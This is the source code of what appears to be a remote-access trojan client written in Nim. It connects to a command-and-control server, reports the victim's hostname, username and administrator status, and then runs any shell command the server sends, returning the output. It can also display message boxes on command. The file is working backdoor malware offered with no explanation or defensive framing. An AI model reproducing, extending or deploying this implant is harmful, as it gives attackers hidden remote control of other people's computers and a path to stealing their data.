import net, strformat, strutils, osproc, os, base64, json

import modules, communication

let client: Socket = newSocket()
client.connect("127.0.0.1", Port(1234))

proc receiveCommands(client: Socket) =
    client.connectToC2()
    while true:
        let line = client.recvLine()

        if line.len == 0:
            echo "server down"
            quit(0)

        let task = decode(line)

        if task == "hi":
            client.identify(
                hostname=hostname(),
                username=username(), 
                isAdmin=areWeAdmin()
            )
        else:
            let jsonNode = parseJson(task)
            case jsonNode["task"].getStr():
            of "shell":
                let toExec = jsonNode["shellCmd"].getStr()
                try:
                    let (output, _) = execCmdEx(toExec, workingDir = getCurrentDir())
                    client.sendOutput("CMD", output)
                except OSError:
                    client.sendOutput("CMD", getCurrentExceptionMsg())
            of "msgbox":
                discard msgbox(jsonNode["title"].getStr(), jsonNode["caption"].getStr())

receiveCommands(client)
  
client.close()
